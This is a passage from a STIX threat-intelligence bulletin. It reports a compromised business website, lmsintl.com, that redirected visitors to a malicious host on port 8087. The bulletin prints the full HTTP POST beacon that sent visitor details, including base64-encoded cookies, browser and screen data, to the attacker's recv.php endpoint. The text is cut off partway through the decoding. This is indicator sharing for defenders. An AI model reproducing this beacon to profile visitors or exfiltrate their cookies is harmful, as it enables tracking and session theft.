stix:STIX_Header.stix:Title: Legitimate Business Website Redirecting to Malicious Domain
stix:STIX_Header.stix:Description: This indicator bulletin was updated to reflect the correct TLP/Handling instructions.On 3 September 2014, it was reported that a valid business\'s web site had been compromised and was redirecting to a malicious domain. The compromised domain, that was observed redirecting to the malicious domain, is www.lmsintl.com. The site was observed redirecting to mail.webmailgoogle.com on port 8087.

stix:Indicator.indicator:Description: This URL was observed as part of the malicious redirect. As outlined, this was used to send host information to the malicious domain.HTTP Post request fingerprint data:----- BEGIN HTTP POST REQUEST -----POST /i/recv.php HTTP/1.1Accept: image/gif, image/jpeg, image/pjpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, */*Referer: http://www.lmsintl.com/supportAccept-Language: en-usUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET4.0C; IT)Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateHost: mail.webmailgoogle.com:8087Content-Length: 760Connection: Keep-AliveCache-Control: no-cache projectid=MQ%3D%3D&seed=OTQwOTE0MDkxNDk5MjM0NzA%3D&ip=[REDACTED]&referrer=[REDACTED]&agent=TW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgOC4wOyBXaW5kb3dzIE5UIDUuMTsgVHJpZGVudC80LjA7IC5ORVQgQ0xSIDIuMC41MDcyNzsgLk5FVCBDTFIgMy4wLjA0NTA2LjY0ODsgLk5FVCBDTFIgMy41LjIxMDIyOyAuTkVUNC4wQzsgSVQp&location=aHR0cDovL3d3dy5sbXNpbnRsLmNvbS9zdXBwb3J0&toplocation=aHR0cDovL3d3dy5sbXNpbnRsLmNvbS9zdXBwb3J0&cookie=TE1TU2FsZXNSZXBSZWZlcmVyOyBBU1BTRVNTSU9OSURDQ1NTQkNEUT1KQ1BCQ0NPQ1BBTkNJR0tQRUNNTU1BRVA7IHJlY29yZGlkPTk0MDkxNDA5MTQ5OTIzNDcw&title=TE1TIEN1c3RvbWVyIFN1cHBvcnQ%3D&domain=d3d3Lmxtc2ludGwuY29t&charset=dXRmLTg%3D&screen=MTUxN3g3OTU%3D&platform=V2luMzI%3D&lang=ZW4tdXM%3D----- END HTTP POST REQUEST -----Decoded HTTP Post content:projectid=1&seed=94091409149923470&ip=[REDACTED]&referrer=[REDACTED]&agent=Mozilla/4.0 (compatible;
